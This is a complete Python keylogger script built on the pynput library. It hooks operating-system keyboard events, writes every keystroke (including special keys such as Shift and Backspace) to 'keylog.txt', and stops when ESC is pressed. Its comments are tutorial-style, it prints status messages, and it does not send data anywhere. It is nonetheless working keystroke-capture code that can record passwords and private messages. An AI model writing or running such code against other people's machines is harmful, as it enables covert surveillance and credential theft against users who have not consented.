from pynput.keyboard import Key, Listener

# The file where all keystrokes are saved in background
log_file = "keylog.txt"

def on_press(key):
    # Opens the file in "append" mode ('a') so we don't overwrite previous keys
    with open(log_file, "a") as f:
        try:
            # for characters , alphanumeric too
            f.write(key.char)
        except AttributeError:
            # If it's a special key (Space, Enter, Shift), it will trigger an AttributeError.
            # handling the common keys
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("\t")
            else:
                # For other special keys (like Shift, Ctrl, Backspace), wrap them in brackets
                f.write(f" [{key}] ")

def on_release(key):
    """
    This function fires every time a key is released. 
    We use it to create a Kill Switch.
    """
    # If the user presses the ESC key, stop the listener and exit the program
    if key == Key.esc:
        print("\n ESC pressed. Stopping keylogger...")
        return False
# listening to key captures
if __name__ == "__main__":
    print("Keylogger started in the background")
    print("Saving keystrokes to 'keylog.txt'")
    print("Press 'ESC' to stop the program safely")
    
    # Start the Listener, which hooks into the OS keyboard events
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()